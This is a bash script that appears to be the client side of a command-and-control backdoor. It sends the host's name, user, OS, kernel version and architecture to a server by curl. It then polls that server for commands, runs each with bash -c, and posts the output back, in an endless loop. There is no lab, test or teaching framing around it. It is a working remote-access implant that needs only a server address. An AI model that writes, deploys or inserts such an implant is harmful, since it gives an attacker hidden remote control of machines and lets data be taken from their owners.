#!/bin/bash

SERVERIP="127.0.0.1"
SERVERPORT="80"
WAITTIME="1"

HOSTNAME=$(hostname)
USER=$(whoami)
OS=$(uname)
VERSION=$(uname -r)
ARCH=$(uname -m)
ID="$USER@$HOSTNAME"
SERVER="http://$SERVERIP:$SERVERPORT"

# Register
curl -s -X POST -d "id=$ID" -d "hostname=$HOSTNAME" \
     -d "username=$USER" -d "os=$OS" -d "version=$VERSION" \
     -d "arch=$ARCH" "$SERVER/register"

#curl -s -X POST -d "id=$ID" -d "hostname=$HOSTNAME" \
#     -d "username=$USER" -d "os=$OS" -d "version=$VERSION" \
#     "$SERVER/register"

# Command loop
while true; do
    CMD=$(curl -s "$SERVER/$ID.html")
    if [ -n "$CMD" ]; then
        if [ "$CMD" == "exit" ]; then
            echo "Received exit command. Terminating client..."
            exit 0
        fi
        RESULT=$(bash -c "$CMD" 2>&1)
        curl -s -X POST -d "cmd=$CMD" --data-urlencode "result=$RESULT" "$SERVER/$ID/result"
    fi
    sleep $WAITTIME
done
